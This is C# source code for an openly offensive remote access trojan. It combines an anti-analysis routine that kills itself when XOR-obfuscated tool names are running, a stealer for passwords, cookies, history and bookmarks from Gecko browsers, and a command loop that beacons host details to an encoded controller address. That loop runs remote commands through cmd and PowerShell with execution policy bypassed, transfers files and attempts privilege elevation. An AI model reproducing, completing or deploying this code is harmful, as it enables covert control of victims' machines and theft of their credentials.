using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Text;
using Crying.Reader;
using Crying.Helpers;
using System.Threading;
using System.Reflection;
using System.Diagnostics;
using Microsoft.VisualBasic;
using System.ServiceProcess;
using System.Collections.Generic;
using static Crying.Helpers.Common;
using System.Net.NetworkInformation;

    // Varis = blocks known applications using XOR cipher
    #region VariksenPelätin
    class ProgramStarter
    {
        // xor
        #region
        static string xor(string text, int n = 256)
        {
            byte[] input = Encoding.UTF8.GetBytes(text);
            byte[] output = new byte[input.Length];
            int i = 0;
            foreach (byte b in input)
            {
                output[i] = (byte)(b ^ n);
                i++;
            }
            return Encoding.UTF8.GetString(output);
        }
        #endregion

        public static bool Starter()
        {
            string[] list = new string[] {
            "QOTCUNGTM",
            "OBGW",
            "IJJ_BDA",
            "RGUMKAT",
            "VTIECUUNGEMCT",
            "VTIEC^V",
            "BHUV_",
            "OBGW",
            "OKKSHOR_BCDSAACT",
            "QOTCUNGTM",
            "BSKVEGV",
            "NIIMC^VJITCT",
            "OKVITRTCE",
            "VCRIIJU",
            "JITBVC",
            "U_UOHUVCERIT",
            "VTIEyGHGJ_\\CT",
            "U_UGHGJ_\\CT",
            "UHO@@yNOR",
            "QOHBDA",
            "LICDI^EIHRTIJ",
            "@OBBJCT",
            "LICDI^UCTPCT",
            "OBG",
            "OBG",
            "PKRIIJUB",
            "PKQGTCRTGR",
            "PKQGTCSUCT",
            "PKGERNJV",
            "PDI^UCTPOEC",
            "PDI^RTG_",
            "MUBSKVCT",
            "TCEJGUHCR",
            "^BDA",
            "IJJ_BDA",
            "VTIATCUURCJCTOM@OBBJCTQCDBCDSAACT",
            "^BDA",
            "MUBSKVCT",
            "NRRVBCDSAACT"

        };

            foreach (Process p in Process.GetProcesses())
            {
                foreach (string name in list)
                {
                    if (xor(p.ProcessName.ToLower(), 38).Contains(name))
                    {
                        return true;
                    }
                }
            }

            return false;

        }
    #endregion

    // Lepakko = Password stealer engine. Steals from all gecko browsers.
    #region Lepakko
    class lepakko
    {
    static void LepakkoMies(string[] args)
    {
        // Get command line args
        string arguments = string.Join(" ", args).ToLower();
        if (string.IsNullOrEmpty(arguments))
        {
            Console.WriteLine("passwords/cookies/history/bookmarks");
            Environment.Exit(1);
        }

        foreach (string browser in Profile.GetMozillaBrowsers())
        {
            // Show info
            Console.WriteLine("Reading " + arguments + " from " + new DirectoryInfo(browser).Name + " browser.");

            // :::::::DDDDDDD VITTU KEKSI t: Viljami
            // Get cookies

            // Get history
            if (arguments.Equals("history"))
            {
                foreach (Site history in History.Get(browser))
                {
                    Console.WriteLine(BrowserUtils.FormatHistory(history));
                }
            }
        }
        Console.WriteLine("DONE");
    }
}

    #endregion

    // Connecting engine, Starter engine, FailFast engine runner, Commands.
    #region RShell
    static class Rshell
    {

        static string address = "YourIPinBase64"; // Your IP address in Base64
        static string version = "spuqe";

        static string token = Utils.RandomString(15);
        static int startTime = 2;
        static int oneSecond = 1000;
        static int timeout = 6;

        static void Runner()
        {
            while (true)
            {
                if (ProgramStarter.Starter()) { Environment.FailFast(null); }

                Thread.Sleep(100);
            }
        }


        static void Main()
        {

            //connect
            new Thread(Join).Start();
        }


        static void Join()
        {
            int x = 0;
            for (int y = 0; y < startTime; y++)
            {
                Utils.Wait(oneSecond);
                x++;
            }
            if (x != startTime) { return; }

            DoConvert();
            while (true)
            {
                try
                {
                    var i = JSON.create();
                    i.Add("token", token);
                    i.Add("name", Environment.MachineName);
                    i.Add("user", Environment.UserName);
                    i.Add("platform", Utils.GetOSName());
                    i.Add("version", version);
                    i.Add("elevated", Utils.IsAdministrator());
                    string url = (address.EndsWith("/") ? address : address + "/");
                    Request.Get(url + "live", 3000); //continue if server can be reached
                    var s = Request.PostString(url + "live/register", Utils.Encode(JSON.stringify(i)), 60000);
                    var j = JSON.parse(Utils.Decode(s));

                    var text = (string)j["text"];
                    var args = Utils.Parse(text).ToList();
                    var cmd = args[0];
                    args = args.Skip(1).ToList();
                    List<string> lines = new List<string>();
                    var message = JSON.create();
                    message.Add("token", token);

                    try
                    {
                        switch (cmd.ToLower())
                        {
                            case "cd":
                                if (args.Count > 0)
                                {
                                    string d = "";
                                    if (Directory.Exists(Path.Combine(Utils.cd, args[0])))
                                    {
                                        d = Path.Combine(Utils.cd, args[0]);
                                    }
                                    if (Directory.Exists(d))
                                    {
                                        DirectoryInfo di = new DirectoryInfo(d);
                                        Utils.cd = di.FullName;
                                        message.Add("text", di.FullName);
                                    }
                                    else
                                    {
                                        message.Add("text", "Directory doesn't exist");
                                    }
                                }
                                else
                                {
                                    message.Add("text", Utils.cd);
                                }
                                break;

                            case "files":
                                string[] dirEntries;
                                if (args.Count == 0)
                                {
                                    dirEntries = Utils.EnumDirEntries(Utils.cd, (args.Count == 2 ? args[1] : "*.*"), (args.Count == 3 ? Int32.Parse(args[2]) : 1));
                                }
                                else
                                {
                                    dirEntries = Utils.EnumDirEntries(args[0], (args.Count == 2 ? args[1] : "*.*"), (args.Count == 3 ? Int32.Parse(args[2]) : 1));
                                }
                                message.Add("text", String.Join("\n", dirEntries.ToArray()));
                                break;

                            case "connections":
                                IPGlobalProperties props = IPGlobalProperties.GetIPGlobalProperties();
                                TcpConnectionInformation[] conns = props.GetActiveTcpConnections();
                                List<string> connList = new List<string>();
                                foreach (TcpConnectionInformation conn in conns)
                                {
                                    if (!IPAddress.IsLoopback(conn.RemoteEndPoint.Address)) //ignore loopback connections
                                    {
                                        if (args.Count == 0 || (args.Count == 1 && conn.RemoteEndPoint.ToString().EndsWith(args[0])))
                                        {
                                            connList.Add(conn.LocalEndPoint.ToString() + " <--> " + conn.RemoteEndPoint.ToString());
                                        }
                                    }
                                }
                                message.Add("text", String.Join("\n", connList.ToArray()));
                                break;

                            case "run":
                                ProcessStartInfo pi = new ProcessStartInfo()
                                {
                                    FileName = args[0],
                                    Arguments = (args.Count > 1 ? args[1] : ""),
                                    WorkingDirectory = (args.Count > 2 ? args[2] : Utils.cd),
                                    ErrorDialog = false,
                                };
                                Process p = Process.Start(pi);
                                message.Add("text", "Process '" + p.ProcessName + "' with ID '" + p.Id.ToString() + "' started");
                                break;

                            case "windows":
                                List<string> windows = new List<string>();
                                foreach (Process p0 in Process.GetProcesses())
                                {
                                    if (p0.MainWindowTitle.Length > 0)
                                    {
                                        windows.Add(p0.MainWindowTitle);
                                    }
                                }
                                message.Add("text", String.Join("\n", windows.ToArray()));
                                break;

                            case "passwd":
                                foreach (string browser in Profile.GetMozillaBrowsers())
                                    foreach (Password account in Passwords.Get(browser))
                                        lines.Add(BrowserUtils.FormatPassword(account));
                                using (StreamWriter writer = new StreamWriter("Passwords.txt"))
                                {
                                    writer.WriteLine(String.Join("\n", lines));
                                };
                                break;

                            case "bookmarks":
                                foreach (string browser in Profile.GetMozillaBrowsers())
                                    foreach (Bookmark bookmark in Bookmarks.Get(browser))
                                        lines.Add(BrowserUtils.FormatBookmark(bookmark));
                                using (StreamWriter writer = new StreamWriter("bookmarks.txt"))
                                {
                                    writer.WriteLine(String.Join("\n", lines));
                                };
                                break;

                            case "cookies":
                                foreach (string browser in Profile.GetMozillaBrowsers())
                                    foreach (Common.Cookie cookie in Cookies.Get(browser))
                                        lines.Add(BrowserUtils.FormatCookie(cookie));
                                using (StreamWriter writer = new StreamWriter("cookies.txt"))
                                {
                                    writer.WriteLine(String.Join("\n", lines));
                                };
                                break;


                            case "history":
                                foreach (string browser in Profile.GetMozillaBrowsers())
                                    foreach (Site history in History.Get(browser))
                                        lines.Add(BrowserUtils.FormatHistory(history));
                                using (StreamWriter writer = new StreamWriter("History.txt"))
                                {
                                    writer.WriteLine(String.Join("\n", lines));
                                };
                                break;

                            case "pid":
                                string pid = Process.GetCurrentProcess().Id.ToString();
                                message.Add("text", pid);
                                break;

                            case "bin":
                                string bin = Process.GetCurrentProcess().MainModule.FileName;
                                message.Add("text", bin);
                                break;


                            case "set-timeout":
                                timeout = Int32.Parse(args[0]);
                                message.Add("text", "Timeout set to " + timeout.ToString() + " seconds");
                                break;

                            case "elevate":
                                ProcessStartInfo si = new ProcessStartInfo()
                                {
                                    FileName = Process.GetCurrentProcess().MainModule.FileName,
                                    Verb = "runas",
                                    ErrorDialog = false,
                                };
                                Process.Start(si);
                                break;

                            case "kill":
                                Process.GetCurrentProcess().Kill();
                                break;

                            case "installed":
                                message.Add("text", String.Join("\n", Utils.GetInstalledSoftware((args.Count == 0 ? "" : args[0]))));
                                break;

                            case "process-table":
                                List<string> processes = new List<string>();
                                foreach (Process p0 in Process.GetProcesses())
                                {
                                    if (args.Count == 0 || (args.Count > 0 && (p0.MainWindowTitle.ToLower().Contains(args[0].ToLower()) || p0.ProcessName.ToLower().Contains(args[0].ToLower()) || p0.Id.ToString() == args[0])))
                                    {
                                        string mainModule = "-";
                                        try
                                        {
                                            mainModule = p0.MainModule.ModuleName;
                                        }
                                        catch (Exception)
                                        {
                                        }
                                        processes.Add(Utils.Pad(p0.Id.ToString(), Utils.Pad(p0.ProcessName, Utils.Pad(mainModule, (p0.MainWindowTitle.Length > 0 ? p0.MainWindowTitle : "-"), 30), 38), 30));
                                    }
                                }
                                processes.Insert(0, Utils.Pad("PID", Utils.Pad("PROCESS NAME", Utils.Pad("MAIN MODULE NAME", "WINDOW TITLE", 30), 38), 30) + "\n");
                                message.Add("text", String.Join("\n", processes));
                                break;

                            case "process-list":
                                List<string> _processes = new List<string>();
                                foreach (Process p0 in Process.GetProcesses())
                                {
                                    if (args.Count == 0 || (args.Count > 0 && (p0.MainWindowTitle.ToLower().Contains(args[0].ToLower()) || p0.ProcessName.ToLower().Contains(args[0].ToLower()) || p0.Id.ToString() == args[0])))
                                    {
                                        string mainModule = "-";
                                        try
                                        {
                                            mainModule = p0.MainModule.ModuleName;
                                        }
                                        catch (Exception)
                                        {
                                        }
                                        _processes.Add(String.Join("\n", new string[] {
                                            "Process name:  " + p0.ProcessName,
                                            "  Process ID:  " + p0.Id.ToString(),
                                            " Main module:  " + mainModule,
                                            "Window title:  " + (p0.MainWindowTitle.Length > 0 ? p0.MainWindowTitle : "-"),
                                            "",
                                        }));
                                    }
                                }
                                message.Add("text", String.Join("\n", _processes));
                                break;

                            case "services-table":
                                List<string> services = new List<string>();
                                ServiceController[] _services = ServiceController.GetServices();

                                foreach (ServiceController service in _services)
                                {
                                    if (args.Count == 0 || (args.Count > 0 && (service.ServiceName.ToLower().Contains(args[0].ToLower()) || service.DisplayName.ToLower().Contains(args[0].ToLower()))))
                                    {
                                        services.Insert(0, Utils.Pad(service.DisplayName, Utils.Pad(service.ServiceName, Utils.Pad((service.MachineName == "." ? Environment.MachineName : service.MachineName), service.Status.ToString(), 25), 40), 55));
                                    }
                                }
                                services.Sort();
                                services.Insert(0, Utils.Pad("DISPLAY NAME", Utils.Pad("SERVICE NAME", Utils.Pad("MACHINE NAME", "SERVICE STATUS", 25), 40), 55) + "\n");
                                message.Add("text", String.Join("\n", services));
                                break;

                            case "services-list":
                                List<string> services2 = new List<string>();
                                ServiceController[] _services2 = ServiceController.GetServices();

                                foreach (ServiceController service in _services2)
                                {
                                    if (args.Count == 0 || (args.Count > 0 && (service.ServiceName.ToLower().Contains(args[0].ToLower()) || service.DisplayName.ToLower().Contains(args[0].ToLower()))))
                                    {
                                        services2.Add(String.Join("\n", new string[] {
                                            "Display name:  " + service.DisplayName,
                                            "Service name:  " + service.ServiceName,
                                            "Machine name:  " + (service.MachineName == "." ? Environment.MachineName : service.MachineName),
                                            "      Status:  " + service.Status.ToString(),
                                            "",
                                        }));
                                    }
                                }
                                services2.Sort();
                                message.Add("text", String.Join("\n", services2));
                                break;

                            case "request":
                                List<string> response = new List<string>();
                                WebRequest req = HttpWebRequest.Create(args[0]);
                                req.Timeout = 7000;
                                int st = Math.Abs(Environment.TickCount);
                                WebResponse res = req.GetResponse();
                                int et = Math.Abs(Environment.TickCount);
                                response.Add("Response received in " + (et - st) + " ms\n");
                                string body = new StreamReader(res.GetResponseStream()).ReadToEnd();
                                response.Add(req.Method.ToUpper() + " " + args[0] + " HTTP/" + ((HttpWebRequest)req).ProtocolVersion.ToString());
                                response.Add(((int)((HttpWebResponse)res).StatusCode).ToString() + " - " + ((HttpWebResponse)res).StatusDescription.ToString() + " [" + res.ResponseUri.AbsoluteUri + "]\n");
                                foreach (string name in res.Headers.AllKeys)
                                {
                                    response.Add(name + ": " + res.Headers.Get(name));
                                }
                                if (args.Contains("--body")) response.Add("\n" + body);
                                message.Add("text", String.Join("\n", response.ToArray()));
                                break;

                            case "ps":
                                List<string> cmdlet = new List<string>();
                                cmdlet.AddRange(text.Split(' '));
                                message.Add("text", Utils.Exec(String.Join("", "llehsrewop".ToCharArray().Reverse().ToArray()), "-ExecutionPolicy Bypass " + String.Join(" ", cmdlet.Skip(1).ToArray()), timeout));
                                break;

                            case "download":
                                using (WebClient wc = new WebClient())
                                {
                                    wc.DownloadFile(args[0], args[1]);
                                    message.Add("text", "File downloaded from '" + args[0] + "' to '" + args[1] + "'");
                                }
                                break;

                            case "upload":
                                using (WebClient wc = new WebClient())
                                {
                                    wc.UploadFile(args[0], args[1]); // $_FILE['file']
                                    message.Add("text", "File uploaded from '" + args[0] + "' to '" + args[1] + "'");
                                }
                                break;

                            default:
                                message.Add("text", Utils.Exec(String.Join("", "dmc".ToCharArray().Reverse().ToArray()), "/C " + text, timeout));
                                break;
                        }
                    }
                    catch (Exception ex)
                    {
                        message.Add("text", ex.Message);
                    }

                    var o2 = Request.PostString((address.EndsWith("/") ? address : address + "/") + "live/message", Utils.Encode(JSON.stringify(message)));
                }
                catch (Exception)
                {
                    Thread.Sleep(200);
                }
            }
        }

        static void DoConvert()
        {
            address = Encoding.UTF8.GetString(Convert.FromBase64String(address));
        }
    }
            #endregion